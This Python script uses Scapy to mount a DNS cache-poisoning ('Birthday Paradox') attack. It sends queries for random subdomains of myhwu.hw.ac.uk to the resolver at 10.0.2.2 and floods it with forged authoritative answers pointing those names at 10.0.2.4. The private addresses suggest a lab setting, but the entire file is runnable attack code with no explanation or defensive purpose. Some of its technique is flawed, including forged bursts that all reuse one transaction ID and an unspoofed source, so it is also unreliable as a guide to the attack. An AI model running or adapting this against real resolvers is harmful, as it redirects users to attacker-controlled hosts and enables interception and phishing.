from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send  # Import necessary components from Scapy
import random  # For generating random values
import string  # For generating random strings (subdomains)
import time  # For timing control during the attack

# Set the target DNS server, domain to spoof, and the spoofed IP address
target_ip = "10.0.2.2"
domain = "myhwu.hw.ac.uk"
spoofed_ip = "10.0.2.4"

def generate_random_subdomain(length=8):
    # Generates a random subdomain of given length using letters and digits
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def send_dns_query(subdomain):
    # Crafts and sends a DNS query for the generated subdomain under the target domain
    dns_request = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=subdomain + "." + domain))
    send(dns_request, verbose=0)

def send_forged_response(subdomain, transaction_id):
    # Crafts and sends a forged DNS response with the spoofed IP for the subdomain
    forged_response = IP(dst=target_ip)/UDP(dport=53)/DNS(id=transaction_id, qr=1, aa=1, qd=DNSQR(qname=subdomain + "." + domain), an=DNSRR(rrname=subdomain + "." + domain, rdata=spoofed_ip))
    send(forged_response, verbose=0)

def dns_birthday_attack(num_queries, burst_size=100):
    # Conducts the DNS Birthday Paradox attack
    print(f"Starting DNS Birthday Paradox attack against {target_ip}")
    start_time = time.time()

    for i in range(num_queries):
        subdomain = generate_random_subdomain()  # Generate a new subdomain for each query
        send_dns_query(subdomain)  # Send the DNS query

        # Every burst_size queries, send a batch of forged responses with a random transaction ID
        if i % burst_size == 0:
            transaction_id = random.randint(0, 65535)
            for _ in range(burst_size):
                send_forged_response(subdomain, transaction_id)

        # Print progress every 1000 queries
        if i % 1000 == 0:
            print(f"Sent {i} queries...")

        time.sleep(0.01)  # Add a small delay to avoid overwhelming the target DNS server

    end_time = time.time()
    attack_duration = end_time - start_time  # Calculate the duration of the attack

    # Print the attack summary
    print(f"DNS Birthday Paradox attack completed.")
    print(f"Total queries sent: {num_queries}")
    print(f"Attack duration: {attack_duration:.2f} seconds")

# Main execution starts here
if __name__ == "__main__":
    num_queries = 500  # Set the total number of DNS queries to send during the attack
    dns_birthday_attack(num_queries)  # Start the attack
